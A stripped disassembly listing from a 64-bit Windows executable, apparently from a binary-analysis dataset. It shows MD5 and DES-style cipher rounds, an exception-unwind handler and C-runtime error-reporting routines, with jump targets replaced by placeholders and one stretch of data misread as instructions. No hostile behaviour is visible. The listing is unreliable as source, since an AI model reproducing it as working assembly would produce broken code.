mov r10d [ rsi + 0x20 ]
add ebx r11d
rol ebx 0x16
mov r11d edx
add ebx ecx
xor r11d ecx
lea eax [ rax + r10 + 0x698098d8 ]
and r11d ebx
xor r11d edx
mov r10d [ rsi + 0x24 ]
add eax r11d
rol eax 0x7
mov r11d ecx
add eax ebx
xor r11d ebx
lea edx [ rdx + r10 - 0x74bb0851 ]
and r11d eax
xor r11d ecx
mov r10d [ rsi + 0x28 ]
add edx r11d
rol edx 0xc
mov r11d ebx
add edx eax
xor r11d eax
lea ecx [ rcx + r10 - 0xa44f ]
and r11d edx
xor r11d ebx
mov r10d [ rsi + 0x2c ]
add ecx r11d
rol ecx 0x11
mov r11d eax
add ecx edx
xor r11d edx
lea ebx [ rbx + r10 - 0x76a32842 ]
and r11d ecx
xor r11d eax
mov r10d [ rsi + 0x30 ]
add ebx r11d
rol ebx 0x16
mov r11d edx
add ebx ecx
xor r11d ecx
lea eax [ rax + r10 + 0x6b901122 ]
and r11d ebx
xor r11d edx
mov r10d [ rsi + 0x34 ]
add eax r11d
rol eax 0x7
mov r11d ecx
add eax ebx
xor r11d ebx
lea edx [ rdx + r10 - 0x2678e6d ]
and r11d eax
xor r11d ecx
mov r10d [ rsi + 0x38 ]
add edx r11d
rol edx 0xc
mov r11d ebx
add edx eax
xor r11d eax
lea ecx [ rcx + r10 - 0x5986bc72 ]
and r11d edx
xor r11d ebx
mov r10d [ rsi + 0x3c ]
add ecx r11d
rol ecx 0x11
mov r11d eax
add ecx edx
xor r11d edx
lea ebx [ rbx + r10 + 0x49b40821 ]
and r11d ecx
xor r11d eax
mov r10d [ rsi ]
add ebx r11d
rol ebx 0x16
mov r11d edx
add ebx ecx
mov r10d [ rsi + 0x4 ]
mov r11d edx
mov r12d edx
not r11d
lea eax [ rax + r10 - 0x9e1da9e ]
and r12d ebx
and r11d ecx
mov r10d [ rsi + 0x18 ]
or r12d r11d
mov r11d ecx
add eax r12d
mov r12d ecx
rol eax 0x5
add eax ebx
not r11d
lea edx [ rdx + r10 - 0x3fbf4cc0 ]
and r12d eax
and r11d ebx
mov r10d [ rsi + 0x2c ]
or r12d r11d
mov r11d ebx
add edx r12d
mov r12d ebx
rol edx 0x9
add edx eax
not r11d
lea ecx [ rcx + r10 + 0x265e5a51 ]
and r12d edx
and r11d eax
mov r10d [ rsi ]
or r12d r11d
mov r11d eax
add ecx r12d
mov r12d eax
rol ecx 0xe
add ecx edx
not r11d
lea ebx [ rbx + r10 - 0x16493856 ]
and r12d ecx
and r11d edx
mov r10d [ rsi + 0x14 ]
or r12d r11d
mov r11d edx
add ebx r12d
mov r12d edx
rol ebx 0x14
add ebx ecx
not r11d
lea eax [ rax + r10 - 0x29d0efa3 ]
and r12d ebx
and r11d ecx
mov r10d [ rsi + 0x28 ]
or r12d r11d
mov r11d ecx
add eax r12d
mov r12d ecx
rol eax 0x5
add eax ebx
not r11d
lea edx [ rdx + r10 + 0x2441453 ]
and r12d eax
and r11d ebx
mov r10d [ rsi + 0x3c ]
or r12d r11d
mov r11d ebx
add edx r12d
mov r12d ebx
rol edx 0x9
add edx eax
not r11d
lea ecx [ rcx + r10 - 0x275e197f ]
and r12d edx
and r11d eax
mov r10d [ rsi + 0x10 ]
or r12d r11d
mov r11d eax
add ecx r12d
mov r12d eax
rol ecx 0xe
add ecx edx
not r11d
lea ebx [ rbx + r10 - 0x182c0438 ]
and r12d ecx
and r11d edx
mov r10d [ rsi + 0x24 ]
or r12d r11d
mov r11d edx
add ebx r12d
mov r12d edx
rol ebx 0x14
add ebx ecx
not r11d
lea eax [ rax + r10 + 0x21e1cde6 ]
and r12d ebx
and r11d ecx
mov r10d [ rsi + 0x38 ]
or r12d r11d
mov r11d ecx
add eax r12d
mov r12d ecx
rol eax 0x5
add eax ebx
not r11d
lea edx [ rdx + r10 - 0x3cc8f82a ]
and r12d eax
and r11d ebx
mov r10d [ rsi + 0xc ]
or r12d r11d
mov r11d ebx
add edx r12d
mov r12d ebx
rol edx 0x9
add edx eax
not r11d
lea ecx [ rcx + r10 - 0xb2af279 ]
and r12d edx
and r11d eax
mov r10d [ rsi + 0x20 ]
or r12d r11d
mov r11d eax
add ecx r12d
mov r12d eax
rol ecx 0xe
add ecx edx
not r11d
lea ebx [ rbx + r10 + 0x455a14ed ]
and r12d ecx
and r11d edx
mov r10d [ rsi + 0x34 ]
or r12d r11d
mov r11d edx
add ebx r12d
mov r12d edx
rol ebx 0x14
add ebx ecx
not r11d
lea eax [ rax + r10 - 0x561c16fb ]
and r12d ebx
and r11d ecx
mov r10d [ rsi + 0x8 ]
or r12d r11d
mov r11d ecx
add eax r12d
mov r12d ecx
rol eax 0x5
add eax ebx
not r11d
lea edx [ rdx + r10 - 0x3105c08 ]
and r12d eax
and r11d ebx
mov r10d [ rsi + 0x1c ]
or r12d r11d
mov r11d ebx
add edx r12d
mov r12d ebx
rol edx 0x9
add edx eax
not r11d
lea ecx [ rcx + r10 + 0x676f02d9 ]
and r12d edx
and r11d eax
mov r10d [ rsi + 0x30 ]
or r12d r11d
mov r11d eax
add ecx r12d
mov r12d eax
rol ecx 0xe
add ecx edx
not r11d
lea ebx [ rbx + r10 - 0x72d5b376 ]
and r12d ecx
and r11d edx
mov r10d [ rsi ]
or r12d r11d
mov r11d edx
add ebx r12d
mov r12d edx
rol ebx 0x14
add ebx ecx
mov r10d [ rsi + 0x14 ]
mov r11d ecx
lea eax [ rax + r10 - 0x5c6be ]
mov r10d [ rsi + 0x20 ]
xor r11d edx
xor r11d ebx
add eax r11d
rol eax 0x4
mov r11d ebx
add eax ebx
lea edx [ rdx + r10 - 0x788e097f ]
mov r10d [ rsi + 0x2c ]
xor r11d ecx
xor r11d eax
add edx r11d
rol edx 0xb
mov r11d eax
add edx eax
lea ecx [ rcx + r10 + 0x6d9d6122 ]
mov r10d [ rsi + 0x38 ]
xor r11d ebx
xor r11d edx
add ecx r11d
rol ecx 0x10
mov r11d edx
add ecx edx
lea ebx [ rbx + r10 - 0x21ac7f4 ]
mov r10d [ rsi + 0x4 ]
xor r11d eax
xor r11d ecx
add ebx r11d
rol ebx 0x17
mov r11d ecx
add ebx ecx
lea eax [ rax + r10 - 0x5b4115bc ]
mov r10d [ rsi + 0x10 ]
xor r11d edx
xor r11d ebx
add eax r11d
rol eax 0x4
mov r11d ebx
add eax ebx
lea edx [ rdx + r10 + 0x4bdecfa9 ]
mov r10d [ rsi + 0x1c ]
xor r11d ecx
xor r11d eax
add edx r11d
rol edx 0xb
mov r11d eax
add edx eax
lea ecx [ rcx + r10 - 0x944b4a0 ]
mov r10d [ rsi + 0x28 ]
xor r11d ebx
xor r11d edx
add ecx r11d
rol ecx 0x10
mov r11d edx
add ecx edx
lea ebx [ rbx + r10 - 0x41404390 ]
mov r10d [ rsi + 0x34 ]
xor r11d eax
xor r11d ecx
add ebx r11d
rol ebx 0x17
mov r11d ecx
add ebx ecx
lea eax [ rax + r10 + 0x289b7ec6 ]
mov r10d [ rsi ]
xor r11d edx
xor r11d ebx
add eax r11d
rol eax 0x4
mov r11d ebx
add eax ebx
lea edx [ rdx + r10 - 0x155ed806 ]
mov r10d [ rsi + 0xc ]
xor r11d ecx
xor r11d eax
add edx r11d
rol edx 0xb
mov r11d eax
add edx eax
lea ecx [ rcx + r10 - 0x2b10cf7b ]
mov r10d [ rsi + 0x18 ]
xor r11d ebx
xor r11d edx
add ecx r11d
rol ecx 0x10
mov r11d edx
add ecx edx
lea ebx [ rbx + r10 + 0x4881d05 ]
mov r10d [ rsi + 0x24 ]
xor r11d eax
xor r11d ecx
add ebx r11d
rol ebx 0x17
mov r11d ecx
add ebx ecx
lea eax [ rax + r10 - 0x262b2fc7 ]
mov r10d [ rsi + 0x30 ]
xor r11d edx
xor r11d ebx
add eax r11d
rol eax 0x4
mov r11d ebx
add eax ebx
lea edx [ rdx + r10 - 0x1924661b ]
mov r10d [ rsi + 0x3c ]
xor r11d ecx
xor r11d eax
add edx r11d
rol edx 0xb
mov r11d eax
add edx eax
lea ecx [ rcx + r10 + 0x1fa27cf8 ]
mov r10d [ rsi + 0x8 ]
xor r11d ebx
xor r11d edx
add ecx r11d
rol ecx 0x10
mov r11d edx
add ecx edx
lea ebx [ rbx + r10 - 0x3b53a99b ]
mov r10d [ rsi ]
xor r11d eax
xor r11d ecx
add ebx r11d
rol ebx 0x17
mov r11d ecx
add ebx ecx
mov r10d [ rsi ]
mov r11d 0xffffffff
xor r11d edx
lea eax [ rax + r10 - 0xbd6ddbc ]
or r11d ebx
xor r11d ecx
add eax r11d
mov r10d [ rsi + 0x1c ]
mov r11d 0xffffffff
rol eax 0x6
xor r11d ecx
add eax ebx
lea edx [ rdx + r10 + 0x432aff97 ]
or r11d eax
xor r11d ebx
add edx r11d
mov r10d [ rsi + 0x38 ]
mov r11d 0xffffffff
rol edx 0xa
xor r11d ebx
add edx eax
lea ecx [ rcx + r10 - 0x546bdc59 ]
or r11d edx
xor r11d eax
add ecx r11d
mov r10d [ rsi + 0x14 ]
mov r11d 0xffffffff
rol ecx 0xf
xor r11d eax
add ecx edx
lea ebx [ rbx + r10 - 0x36c5fc7 ]
or r11d ecx
xor r11d edx
add ebx r11d
mov r10d [ rsi + 0x30 ]
mov r11d 0xffffffff
rol ebx 0x15
xor r11d edx
add ebx ecx
lea eax [ rax + r10 + 0x655b59c3 ]
or r11d ebx
xor r11d ecx
add eax r11d
mov r10d [ rsi + 0xc ]
mov r11d 0xffffffff
rol eax 0x6
xor r11d ecx
add eax ebx
lea edx [ rdx + r10 - 0x70f3336e ]
or r11d eax
xor r11d ebx
add edx r11d
mov r10d [ rsi + 0x28 ]
mov r11d 0xffffffff
rol edx 0xa
xor r11d ebx
add edx eax
lea ecx [ rcx + r10 - 0x100b83 ]
or r11d edx
xor r11d eax
add ecx r11d
mov r10d [ rsi + 0x4 ]
mov r11d 0xffffffff
rol ecx 0xf
xor r11d eax
add ecx edx
lea ebx [ rbx + r10 - 0x7a7ba22f ]
or r11d ecx
xor r11d edx
add ebx r11d
mov r10d [ rsi + 0x20 ]
mov r11d 0xffffffff
rol ebx 0x15
xor r11d edx
add ebx ecx
lea eax [ rax + r10 + 0x6fa87e4f ]
or r11d ebx
xor r11d ecx
add eax r11d
mov r10d [ rsi + 0x3c ]
mov r11d 0xffffffff
rol eax 0x6
xor r11d ecx
add eax ebx
lea edx [ rdx + r10 - 0x1d31920 ]
or r11d eax
xor r11d ebx
add edx r11d
mov r10d [ rsi + 0x18 ]
mov r11d 0xffffffff
rol edx 0xa
xor r11d ebx
add edx eax
lea ecx [ rcx + r10 - 0x5cfebcec ]
or r11d edx
xor r11d eax
add ecx r11d
mov r10d [ rsi + 0x34 ]
mov r11d 0xffffffff
rol ecx 0xf
xor r11d eax
add ecx edx
lea ebx [ rbx + r10 + 0x4e0811a1 ]
or r11d ecx
xor r11d edx
add ebx r11d
mov r10d [ rsi + 0x10 ]
mov r11d 0xffffffff
rol ebx 0x15
xor r11d edx
add ebx ecx
lea eax [ rax + r10 - 0x8ac817e ]
or r11d ebx
xor r11d ecx
add eax r11d
mov r10d [ rsi + 0x2c ]
mov r11d 0xffffffff
rol eax 0x6
xor r11d ecx
add eax ebx
lea edx [ rdx + r10 - 0x42c50dcb ]
or r11d eax
xor r11d ebx
add edx r11d
mov r10d [ rsi + 0x8 ]
mov r11d 0xffffffff
rol edx 0xa
xor r11d ebx
add edx eax
lea ecx [ rcx + r10 + 0x2ad7d2bb ]
or r11d edx
xor r11d eax
add ecx r11d
mov r10d [ rsi + 0x24 ]
mov r11d 0xffffffff
rol ecx 0xf
xor r11d eax
add ecx edx
lea ebx [ rbx + r10 - 0x14792c6f ]
or r11d ecx
xor r11d edx
add ebx r11d
mov r10d [ rsi ]
mov r11d 0xffffffff
rol ebx 0x15
xor r11d edx
add ebx ecx
add eax r8d
add ebx r9d
add ecx r14d
add edx r15d
add rsi 0x40
cmp rsi rdi
jb r-xdata
sub_140033b60
push rsi
push rdi
push rbx
push rbp
push r12
push r13
push r14
push r15
pushfq
sub rsp 0x40
mov rax [ r8 + 0x78 ]
mov rbx [ r8 + 0xf8 ]
lea r10 [ r-xdata ]
cmp rbx r10
jb r-xdata
mov rdi [ rax + 0x8 ]
mov rsi [ rax + 0x10 ]
mov [ r8 + 0x98 ] rax
mov [ r8 + 0xa8 ] rsi
mov [ r8 + 0xb0 ] rdi
mov rdi [ r9 + 0x28 ]
mov rsi r8
mov ecx 0x9a
cld
[ rdi ] [ rsi ]
mov rsi r9
xor rcx rcx
mov rdx [ rsi + 0x8 ]
mov r8 [ rsi ]
mov r9 [ rsi + 0x10 ]
mov r10 [ rsi + 0x28 ]
lea r11 [ rsi + 0x38 ]
lea r12 [ rsi + 0x18 ]
mov [ rsp + 0x20 ] r10
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x30 ] r12
mov [ rsp + 0x38 ] rcx
call [ RtlVirtualUnwind@IAT ]
mov eax 0x1
add rsp 0x40
popfq
pop r15
pop r14
pop r13
pop r12
pop rbp
pop rbx
pop rdi
pop rsi
retn
mov rax [ r8 + 0x98 ]
lea r10 [ r-xdata ]
cmp rbx r10
jae r-xdata
lea rax [ rax + 0x28 ]
mov rbp [ rax - 0x8 ]
mov rbx [ rax - 0x10 ]
mov r12 [ rax - 0x18 ]
mov r14 [ rax - 0x20 ]
mov r15 [ rax - 0x28 ]
mov [ r8 + 0x90 ] rbx
mov [ r8 + 0xa0 ] rbp
mov [ r8 + 0xd8 ] r12
mov [ r8 + 0xe8 ] r14
mov [ r8 + 0xf0 ] r15
sub_140033c80
push rdi
mov eax 0x20
call sub_14003d700
sub rsp rax
mov edi ecx
test ecx ecx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
or eax 0xffffffff
sub eax ecx
mov edi eax
add rsp 0x20
pop rdi
retn
mov edx 0x1d
lea r8 [ rw-data ]
mov r9d 0x131
lea ecx [ rdx - 0x14 ]
call sub_1400343a0
mov rcx [ rw-data ]
test rcx rcx
je r-xdata
mov edx 0x1d
lea r8 [ rw-data ]
mov r9d 0x135
lea ecx [ rdx - 0x13 ]
add rsp 0x20
pop rdi
jmp sub_1400343a0
call sub_140034cd0
cmp edi eax
jge r-xdata
mov rcx [ rw-data ]
mov edx edi
mov [ rsp + 0x30 ] rbx
call sub_140034ce0
mov rbx rax
test rax rax
je r-xdata
mov edx 0x1d
lea r8 [ rw-data ]
mov r9d 0x14b
lea ecx [ rdx - 0x13 ]
call sub_1400343a0
test rbx rbx
je r-xdata
dec [ rax ]
cmp [ rax ] 0x0
jg r-xdata
mov rbx [ rsp + 0x30 ]
mov rcx [ rbx + 0x8 ]
lea rdx [ rw-data ]
mov r8d 0x14f
call [ rw-data ]
mov rcx rbx
call sub_140034a90
xor ebx ebx
mov rcx [ rw-data ]
xor r8d r8d
mov edx edi
call sub_140034d00
jmp r-xdata
sub_140033d80
mov [ rsp + 0x8 ] rbx
push rdi
mov eax 0x20
call sub_14003d700
sub rsp rax
xor ebx ebx
mov edi ecx
test ecx ecx
je r-xdata
mov edx 0x1d
lea r8 [ rw-data ]
mov r9d 0x15a
lea ecx [ rdx - 0x14 ]
call sub_1400343a0
mov rcx [ rw-data ]
test rcx rcx
je r-xdata
or eax 0xffffffff
sub eax ecx
mov edi eax
mov edx 0x1d
lea r8 [ rw-data ]
mov r9d 0x161
lea ecx [ rdx - 0x13 ]
call sub_1400343a0
test rbx rbx
je r-xdata
call sub_140034cd0
cmp edi eax
jge r-xdata
xor eax eax
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rbx + 0x8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rw-data ]
mov edx edi
call sub_140034ce0
mov rbx rax
test rax rax
je r-xdata
inc [ rax ]
sub_140033e30
push rbx
mov eax 0x20
call sub_14003d700
sub rsp rax
mov rax [ rw-data ]
mov rbx rcx
test rax rax
je r-xdata
mov rax [ rw-data ]
test rax rax
je r-xdata
add rsp 0x20
pop rbx
jmp rax
call [ GetCurrentThreadId@IAT ]
xor ecx ecx
mov [ rbx ] rcx
mov [ rbx + 0x8 ] rcx
mov [ rbx + 0x8 ] eax
add rsp 0x20
pop rbx
retn
call rax
xor ecx ecx
mov [ rbx ] rcx
mov [ rbx + 0x8 ] rcx
mov [ rbx + 0x8 ] eax
add rsp 0x20
pop rbx
retn
sub_140033ed0
mov eax 0x28
call sub_14003d700
sub rsp rax
cmp [ rw-data ] 0x0
jne r-xdata
add rsp 0x28
retn
lea rcx [ rw-data ]
mov [ rw-data ] 0x1
call sub_14003da5c
test rax rax
je r-xdata
call sub_140035a70
bts eax 0xa
mov [ rw-data ] eax
xor r8d r8d
xor edx edx
mov rcx rax
call sub_14003d528
bts eax 0xa
mov [ rw-data ] eax
add rsp 0x28
retn
sub_140033f40
push rbp
mov eax 0x40
call sub_14003d700
sub rsp rax
lea rbp [ rsp + 0x30 ]
mov [ rbp + 0x20 ] rbx
mov [ rbp + 0x28 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x8 ] rax
mov rax [ rw-data ]
test rax rax
jne r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
xor ecx ecx
call [ GetModuleHandleW@IAT ]
test rax rax
je r-xdata
call [ GetDesktopWindow@IAT ]
call [ GetProcessWindowStation@IAT ]
mov rbx rax
test rax rax
je r-xdata
call rax
jmp r-xdata
mov rax [ rw-data ]
lea rdx [ rw-data ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov [ rw-data ] rax
jmp r-xdata
or eax 0xffffffff
xor r9d r9d
lea rax [ rbp ]
xor r8d r8d
lea edx [ r9 + 0x2 ]
mov rcx rbx
mov [ rsp + 0x20 ] rax
call [ GetUserObjectInformationW@IAT ]
test eax eax
jne r-xdata
mov rcx [ rbp + 0x8 ]
xor rcx rbp
call sub_14003a6a0
mov rbx [ rbp + 0x20 ]
mov rdi [ rbp + 0x28 ]
lea rsp [ rbp + 0x10 ]
pop rbp
retn
mov [ rw-data ] 0xffffffffffffffff
test rax rax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov eax [ rbp ]
cmp eax 0x200
ja r-xdata
lea r9d [ rax + 0x1 ]
and r9d 0xfffffffe
mov eax r9d
mov [ rbp ] r9d
add rax 0x2
lea rcx [ rax + 0xf ]
cmp rcx rax
ja r-xdata
and rcx 0xfffffffffffffff0
mov rax rcx
call sub_14003d700
sub rsp rcx
lea rax [ rbp ]
lea rdi [ rsp + 0x30 ]
mov edx 0x2
mov rcx rbx
mov r8 rdi
mov [ rsp + 0x20 ] rax
call [ GetUserObjectInformationW@IAT ]
test eax eax
je r-xdata
mov rcx 0xffffffffffffff0
mov eax [ rbp ]
xor ebx ebx
mov rcx rdi
inc eax
and eax 0xfffffffe
mov edx eax
mov [ rbp ] eax
shr rdx 0x1
mov [ rdi + rdx * 2 ] bx
lea rdx [ rw-data ]
call sub_14003db4c
test rax rax
setne bl
mov eax ebx
jmp r-xdata
sub_1400340d0
mov [ rsp + 0x8 ] rcx
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x20 ] r9
push rbp
push rbx
push rsi
push rdi
push r12
push r13
mov eax 0x278
call sub_14003d700
sub rsp rax
lea rbp [ rsp + 0x50 ]
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x210 ] rax
mov ecx 0xfffffff4
call [ GetStdHandle@IAT ]
test rax rax
je r-xdata
mov r8 [ rbp + 0x260 ]
mov rcx r8
call sub_140033c60
inc eax
mov edi eax
add rax rax
lea rcx [ rax + 0xf ]
cmp rcx rax
ja r-xdata
mov rcx rax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
and rcx 0xfffffffffffffff0
mov rax rcx
call sub_14003d700
sub rsp rcx
xor esi esi
lea rbx [ rsp + 0x50 ]
test rbx rbx
jne r-xdata
mov rcx 0xffffffffffffff0
lea rbx [ rbp + 0x268 ]
call sub_14003bc4c
mov rdx [ rbp + 0x260 ]
lea rcx [ rax + 0x60 ]
mov r8 rbx
call sub_14003de08
jmp r-xdata
mov r9d edi
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
lea rbx [ rw-data ]
jmp r-xdata
mov rcx [ rbp + 0x210 ]
xor rcx rbp
call sub_14003a6a0
lea rsp [ rbp + 0x228 ]
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov rdx rsi
test rdi rdi
je r-xdata
mov rdx rsi
test rdi rdi
je r-xdata
lea r9 [ rbp + 0x268 ]
lea rcx [ rbp + 0x10 ]
mov r8 rbx
mov edx 0xff
call sub_14003dcac
mov [ rbp + 0x20e ] si
call [ GetVersion@IAT ]
cmp eax 0x80000000
jae r-xdata
mov r10d 0x53
lea r9 [ __dos_header ]
lea r11d [ r10 + 0x20 ]
lea r12d [ r10 - 0x10 ]
lea r13d [ r10 + 0x10 ]
nop
nop [ rax + rax ] ax
lea r8 [ rw-data ]
lea rdx [ rbp + 0x10 ]
mov r9d 0x10
xor ecx ecx
call [ MessageBoxW@IAT ]
call sub_140033f40
test eax eax
jle r-xdata
inc rdx
cmp rdx rdi
jb r-xdata
lea r8 [ rbx + rdx * 2 + 0x2 ]
nop [ rax ] eax
mov rax [ rbp + 0x260 ]
inc rdx
movsx ecx [ rdx + rax - 0x1 ]
mov [ rbx + rdx * 2 - 0x2 ] cx
cmp rdx rdi
jb r-xdata
lea rdx [ rw-data ]
xor ecx ecx
call [ RegisterEventSourceW@IAT ]
mov [ rsp + 0x40 ] rsi
mov ecx 0x1
mov rbx rax
lea rax [ rbp + 0x10 ]
mov edx ecx
mov [ rbp ] rax
lea rax [ rbp ]
xor r8d r8d
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] esi
mov [ rsp + 0x28 ] cx
mov rcx rbx
xor r9d r9d
mov [ rsp + 0x20 ] rsi
call [ ReportEventW@IAT ]
mov rcx rbx
call [ DeregisterEventSource@IAT ]
jmp r-xdata
cmp [ rbx + rdx * 2 ] 0x25
jne r-xdata
cdqe
movzx eax [ r9 + rax + 0x34350 ]
mov ecx [ r9 + rax * 4 + 0x34338 ]
add rcx r9
jmp rcx
inc rdx
add r8 0x2
jmp r-xdata
mov [ rbx + rdx * 2 + 0x2 ] r10w
jmp r-xdata
mov [ rbx + rdx * 2 + 0x2 ] r11w
jmp r-xdata
mov [ rbx + rdx * 2 + 0x2 ] r12w
jmp r-xdata
mov [ rbx + rdx * 2 + 0x2 ] r13w
movzx eax [ r8 ]
add eax 0xffffffd6
cmp eax 0x49
ja r-xdata
sub_140034356
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add eax 0x5050505
add eax 0x1050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add al [ 0x145084884 ]
add eax 0x5050505
add eax 0x5050505
add eax [ 0x145084894 ]
add eax 0x5050505
add eax 0x5050505
add al 0xcc
int3
sub_1400343a0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
mov eax 0x20
call sub_14003d700
sub rsp rax
mov edi r9d
mov rsi r8
mov ebx edx
mov ebp ecx
test edx edx
jns r-xdata
mov rax [ rw-data ]
test rax rax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
call rax
mov ecx edx
call sub_140033d80
test rax rax
je r-xdata
lea r9 [ rw-data ]
lea rdx [ rw-data ]
lea rcx [ rw-data ]
mov r8d 0x24f
call sub_1400340d0
mov ecx 0x16
call sub_14003e21c
mov ecx 0x3
call sub_14003e198
int3
mov r9d edi
mov r8 rsi
mov rdx rax
mov ecx ebp
call [ rw-data ]
mov ecx ebx
call sub_140033c80
jmp r-xdata
sub_140034460
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push r12
mov eax 0x30
call sub_14003d700
sub rsp rax
mov r10 [ rw-data ]
mov rsi r9
mov ebp r8d
mov ebx edx
mov r12 rcx
test r10 r10
je r-xdata
mov r9d [ rsp + 0x60 ]
mov r8 rsi
mov edx ebp
mov ecx 0x9
call sub_1400343a0
add ebx [ r12 ]
mov r9d [ rsp + 0x60 ]
mov r8 rsi
mov edx ebp
mov ecx 0xa
mov [ r12 ] ebx
call sub_1400343a0
mov eax ebx
mov eax [ rsp + 0x60 ]
mov [ rsp + 0x20 ] eax
call r10
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop r12
retn
sub_1400344f0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
mov r10d [ rcx + 0x4 ]
mov r9d [ rcx ]
mov rdi rcx
mov eax r10d
mov esi 0x8
shr eax 0x4
xor eax r9d
and eax 0xf0f0f0f
xor r9d eax
shl eax 0x4
xor r10d eax
mov eax r9d
shr eax 0x10
xor eax r10d
movzx ecx ax
xor r10d ecx
shl ecx 0x10
xor r9d ecx
mov eax r10d
shr eax 0x2
xor eax r9d
and eax 0x33333333
xor r9d eax
shl eax 0x2
xor r10d eax
mov eax r9d
shr eax 0x8
xor eax r10d
and eax 0xff00ff
xor r10d eax
shl eax 0x8
xor r9d eax
mov eax r10d
shr eax 0x1
xor eax r9d
and eax 0x55555555
mov ebx eax
xor ebx r9d
lea r11d [ rax + rax ]
xor r11d r10d
ror ebx 0x1d
lea r10 [ r--data ]
ror r11d 0x1d
test r8d r8d
je r-xdata
lea rbp [ rdx + 0x70 ]
nop [ rax ] eax
lea rbp [ rdx + 0x8 ]
nop [ rax + rax ] ax
mov r9d [ rbp + 0xc ]
mov ecx [ rbp + 0x8 ]
sub rbp 0x10
xor ecx ebx
xor r9d ebx
mov r8d ecx
ror r9d 0x4
shr rcx 0x12
and ecx 0x3f
mov eax r8d
mov edx [ r10 + rcx * 4 + 0x400 ]
mov ecx [ rbp + 0x10 ]
shr rax 0xa
and eax 0x3f
xor edx [ r10 + rax * 4 + 0x200 ]
mov eax r8d
shr r8 0x1a
shr rax 0x2
and eax 0x3f
xor edx [ r10 + rax * 4 ]
mov eax r9d
shr rax 0x12
and eax 0x3f
xor edx [ r10 + rax * 4 + 0x500 ]
mov eax r9d
shr rax 0xa
and eax 0x3f
xor edx [ r10 + rax * 4 + 0x300 ]
mov eax r9d
shr r9 0x1a
shr rax 0x2
and eax 0x3f
xor edx [ r10 + rax * 4 + 0x100 ]
xor edx [ r10 + r8 * 4 + 0x600 ]
xor edx [ r10 + r9 * 4 + 0x700 ]
mov r9d [ rbp + 0x14 ]
xor r11d edx
xor r9d r11d
xor ecx r11d
mov r8d ecx
ror r9d 0x4
shr rcx 0x12
and ecx 0x3f
mov eax r8d
mov edx [ r10 + rcx * 4 + 0x400 ]
shr rax 0xa
and eax 0x3f
xor edx [ r10 + rax * 4 + 0x200 ]
mov eax r8d
shr r8 0x1a
shr rax 0x2
and eax 0x3f
xor edx [ r10 + rax * 4 ]
mov eax r9d
shr rax 0x12
and eax 0x3f
xor edx [ r10 + rax * 4 + 0x500 ]
mov eax r9d
shr rax 0xa
and eax 0x3f
xor edx [ r10 + rax * 4 + 0x300 ]
mov eax r9d
shr r9 0x1a
shr rax 0x2
and eax 0x3f
xor edx [ r10 + rax * 4 + 0x100 ]
xor edx [ r10 + r8 * 4 + 0x600 ]
xor edx [ r10 + r9 * 4 + 0x700 ]
xor ebx edx
dec rsi
jne r-xdata
mov rbp [ rsp + 0x10 ]
mov rsi [ rsp + 0x18 ]
ror r11d 0x3
ror ebx 0x3
mov eax ebx
shr eax 0x1
xor eax r11d
and eax 0x55555555
xor r11d eax
add eax eax
xor ebx eax
mov eax r11d
shr eax 0x8
xor eax ebx
and eax 0xff00ff
xor ebx eax
shl eax 0x8
xor r11d eax
mov eax ebx
shr eax 0x2
xor eax r11d
and eax 0x33333333
xor r11d eax
shl eax 0x2
xor ebx eax
mov eax r11d
shr eax 0x10
xor eax ebx
movzx ecx ax
xor ebx ecx
shl ecx 0x10
xor r11d ecx
mov ecx ebx
shr ecx 0x4
xor ecx r11d
and ecx 0xf0f0f0f
mov eax ecx
shl ecx 0x4
xor ecx ebx
mov rbx [ rsp + 0x8 ]
xor eax r11d
mov [ rdi + 0x4 ] ecx
mov [ rdi ] eax
mov rdi [ rsp + 0x20 ]
retn
mov r9d [ rbp - 0x4 ]
mov ecx [ rbp - 0x8 ]
add rbp 0x10
xor ecx ebx
xor r9d ebx
mov r8d ecx
ror r9d 0x4
shr rcx 0x12
and ecx 0x3f
mov eax r8d
mov edx [ r10 + rcx * 4 + 0x400 ]
shr rax 0xa
and eax 0x3f
xor edx [ r10 + rax * 4 + 0x200 ]
mov eax r8d
shr r8 0x1a
shr rax 0x2
and eax 0x3f
xor edx [ r10 + rax * 4 ]
mov eax r9d
shr rax 0x12
and eax 0x3f
xor edx [ r10 + rax * 4 + 0x500 ]
mov eax r9d
shr rax 0xa
and eax 0x3f
xor edx [ r10 + rax * 4 + 0x300 ]
mov eax r9d
shr r9 0x1a
shr rax 0x2
and eax 0x3f
xor edx [ r10 + rax * 4 + 0x100 ]
xor edx [ r10 + r8 * 4 + 0x600 ]
xor edx [ r10 + r9 * 4 + 0x700 ]
mov r9d [ rbp - 0xc ]
xor r11d edx
xor r9d r11d
mov ecx r11d
